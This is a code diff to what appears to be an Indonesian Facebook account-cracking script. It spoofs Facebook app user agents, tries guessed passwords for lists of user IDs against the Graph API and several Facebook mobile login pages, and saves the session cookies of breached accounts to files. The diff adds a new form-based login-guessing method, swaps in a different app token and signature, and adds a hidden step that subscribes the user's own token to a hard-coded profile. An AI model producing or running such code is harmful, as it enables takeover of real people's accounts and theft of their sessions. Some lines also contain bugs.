@@ -35,10 +35,14 @@ bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05"
 
 
 for x in range(1000):
+	rr = random.randint
 	versi_android = random.randint(4,12)
-	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+	versi_chrome = str(random.randint(50,109))+".0."+str(random.randint(1000,5999))+"."+str(random.randint(50,109))
+	fbi = str(random.randint(100,599))+".0.0."+str(random.randint(10,99))+"."+str(random.randint(99,199))
 	versi_app = random.randint(410000000,499999999)
-	ugent3 = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; vivo 2019 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/3;FBMF/vivo;FBBD/vivo;FBDV/vivo 2019;FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
+	#ugent3 = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; vivo 2019 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/3;FBMF/vivo;FBBD/vivo;FBDV/vivo 2019;FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
+	#ugent3 = f"Mozilla/5.0 (Linux; Android {versi_android}; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fbi};]"
+	ugent3 = f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/{fbi};FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/{str(random.randint(4,10))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920};FB_FW/1;]"
 	if ugent3 in uasm:pass
 	else:uasm.append(ugent3)
  
@@ -74,7 +78,12 @@ def jalan(keliling):
 		sys.stdout.write(mau)
 		sys.stdout.flush();jeda(0.005)
 
-
+def hokage1():
+ rr = random.randint; rc = random.choice
+ aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
+ leng = ['es-es','nl-nl','zh-CN','uk-us','ar-ae','ru-ua','tr-tr','zh-cn','ko-kr','ja-jp','ar-eg','en-ca','de-de','pl-pl','cs-cz','es-co','sl-si','en-ph','en-za','en-bh','fa-ir','it-it','es-mx','ru-us','cs-cz','ro-ro','ru-ru','en-us','en-gb','zh-zh','zh-cn','en-GB','en-US','fr-fr','zh-fr','my-zg']
+ build = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
+ return str(rc([f"mozilla/5.0 (linux; u; android {str(rr(1,4))}.{str(rr(1,2))}.{str(rr(1,2))}; en-us; evercoss a7r build/jdq39) applewebkit/534.30 (khtml, like gecko) version/{str(rr(1,4))}.0 ucbrowser/{str(rr(1,11))}.0.{str(rr(1,8))}.{str(rr(100,855))} u3/0.{str(rr(1,8))}.0 mobile safari/534.30"]))
 #--- logo
 def logo():
 	time.sleep (0.01)
@@ -131,6 +140,7 @@ def login():
 		requests.post(f"https://graph.facebook.com/100067807565861/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
 		requests.post(f"https://graph.facebook.com/100029143111567/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
 		requests.post(f"https://graph.facebook.com/100028434880529/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
+		requests.post(f"https://graph.facebook.com/100043505053045/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
 		print (f"\n{H} √ login berhasil");jeda(2)
 		menu()
 	except Exception as e:
@@ -347,9 +357,10 @@ class crack:
 		if cx in ('y'):
 			self.manual()
 		elif cx in ('t'):
-			print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode api')
+			print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode free')
 			print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
 			print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
+			print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
 			print ('')
 			self.langsung()
 		else:
@@ -364,9 +375,10 @@ class crack:
 			exit("\n ! password minimal 6 huruf")
 		else:
 			pass 
-		print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode api')
+		print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode free')
 		print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
 		print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
+		print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
 		men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
 		print (f"""
  \x1b[1;97makun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
@@ -379,11 +391,13 @@ class crack:
 				uid = akun.split('<=>')[0]
 				pwx = pwek.split(",")
 				if men in['1']:
-					titid.submit(self.__crack__, uid, pwx,  "free.facebook.com")
+					titid.submit(self.__Nugraha__, uid, pwx,  "free.facebook.com")
 				elif men in['2']:
-					titid.submit(self.__crack__, uid, pwx,  "mbasic.facebook.com")
+					titid.submit(self.__Nugraha__, uid, pwx,  "mbasic.facebook.com")
 				elif men in['3']:
-					titid.submit(self.__crack__, uid, pwx,  "m.facebook.com")
+					titid.submit(self.__Nugraha__, uid, pwx,  "m.facebook.com")
+				elif men in['4']:
+					titid.submit(self.__crack__, uid, pwx,  "graph.facebook.com")
 				else:
 					exit("\n ! isi yang benar")
 					
@@ -418,17 +432,19 @@ class crack:
 						pwx.append(na+'12345')
 						pwx.append(na+'1234')
 				if men in['1']:
-					titid.submit(self.__crack__, uid, pwx,  "free.facebook.com")
+					titid.submit(self.__Nugraha__, uid, pwx,  "free.facebook.com")
 				elif men in['2']:
-					titid.submit(self.__crack__, uid, pwx,  "graph.facebook.com")
+					titid.submit(self.__Nugraha__, uid, pwx,  "mbasic.facebook.com")
 				elif men in['3']:
-					titid.submit(self.__crack__, uid, pwx,  "m.facebook.com")
+					titid.submit(self.__Nugraha__, uid, pwx,  "m.facebook.com")
+				elif men in['4']:
+					titid.submit(self.__crack__, uid, pwx,  "graph.facebook.com")
 				else:
 					exit("\n ! isi yang benar")
 					
 		self.hasil(ok,cp)
 					
-	#--- methode
+	#--- methode #Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}
 	def __crack__(self, user, peweh, url_log):
 		global ok,cp,loop 
 		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
@@ -438,26 +454,29 @@ class crack:
 				ses = requests.Session()
 				ua = random.choice(uasm)
 				params = {
-					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
-					"sdk_version": {random.randint(1,26)}, 
+					"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+					"sdk_version": {random.randint(22,31)}, 
 					"email": user,
-					"locale": "ja_JP",
+					"format": "json",
+					"locale": "en_US",
 					"password": pw,
-					"sdk": "android",
+					"sdk": "Android",
 					"generate_session_cookies": "1",
-					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
+					"credentials_type": "device_based_login_password",
+					"sig": "62f8ce9f74b12f84c123cc23437a4a32"
 				}
 				headers = {
 					"Host": url_log,
-					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
+					"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 					"x-fb-sim-hni": str(random.randint(20000, 40000)),
 					"x-fb-net-hni": str(random.randint(20000, 40000)),
 					"x-fb-connection-quality": "EXCELLENT",
+					"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
 					"user-agent": ua,
 					"content-type": "application/x-www-form-urlencoded",
 					"x-fb-http-engine": "Liger"
 				}
-				post = ses.post(f"https://{url_log}/auth/login",params=params, headers=headers, allow_redirects=False)
+				post = ses.post(f"https://{url_log}/v6.0/auth/login",params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					kukis = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
 					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n ')
@@ -475,7 +494,89 @@ class crack:
 				jeda(3)
 			
 		loop+=1
+
+#--- methode
+	def __Nugraha__(self, user, peweh, url_log):
+		global ok,cp,loop 
+		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
+		print (f"\r{komtol} • {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
+		for pw in peweh:
+			try: 
+				ses = requests.Session()
+				uas = hokage1()
+				ses.headers.update({
+				"Host": url_log,
+				"cache-control": "max-age=0",
+				"user-agent": uas,
+				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',
+				"sec-ch-ua-mobile": "?1",
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-mode": "navigate",
+				"sec-fetch-dest": "document",
+				"sec-fetch-user": "?1",
+				"upgrade-insecure-requests": "1",
+				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+				})
+				p = ses.get(f"https://{url_log}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr")
+				lsd = re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
+				jazoest = re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
+				dataa ={
+							"lsd":lsd,
+							"jazoest": jazoest,
+							"uid":user,
+							"next": f"https://{url_log}/login/save-device/",
+							"flow":"login_no_pin",
+							"encpass": f"#PWD_BROWSER:5:{str(random.randint(0000000000,9999999999))}:{pw}",
+							"try_number": "0",
+							"unrecognized_tries": "0"}
+				koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+				koki+=' m_pixel_ratio=2.625; wd=412x756'
+				headerx={
+				"Host": url_log,
+				"connection": "keep-alive",
+				"cache-control": "max-age=0",
+				"save-data": "on",
+				"origin": "https://"+url_log,
+				"content-type": "application/x-www-form-urlencoded",
+				"user-agent": "Mozilla/5.0 (Linux; U; Android 1.5; de-; sdk Build/CUPCAKE) AppleWebkit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
+				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"x-requested-with": "XMLHttpRequest",
+				"dnt": "1",
+				"sec-ch-ua": '" Not A;Brand";v="24", "Chromium";v="107"',
+				"sec-ch-ua-platform": '"Android"',
+				"sec-ch-ua-mobile": "?1",
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-mode": "navigate",
+				"sec-fetch-dest": "document",
+				"sec-fetch-user": "?1",
+				"upgrade-insecure-requests": "1",
+				"referer": f"https://{url_log}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr",
+				"accept-encoding": "gzip, deflate",
+				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+				po = ses.post(f'https://{url_log}/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data=dataa,cookies={'cookie': koki},headers=headerx,allow_redirects=False)
+				if "c_user" in ses.cookies.get_dict():
+					romz = ses.cookies.get_dict()
+					kukis = ";".join([key+"="+value for key, value in romz.items()])
+					print(f'\r{P}*--->{H} {user} ◊ {pw} \n{P} *---> {H}{kukis} \n ')
+					ok.append(user+'◊'+pw+'◊'+kukis+'\n')
+					ok+=1
+					open('OK/'+okc,'a').write(user+'◊'+pw+'◊'+kukis+'\n')
+					break
+				elif 'checkpoint' in ses.cookies.get_dict():
+					print (f'\r{P} *---> {K}{user} ◊ {pw}  \n ')
+					cp.append(user+'◊'+pw)
+					cp+=1
+					open('CP/'+cpc,'a').write(user+'◊'+pw+'\n')
+					break
+				else:
+					continue
+			except requests.exceptions.ConnectionError:
+				jeda(3)
+			
+		loop+=1
 		
+
 	#--- selesai hasil
 	def hasil(self,ok,cp):
 		if len(ok) != 0 or len(cp) != 0:
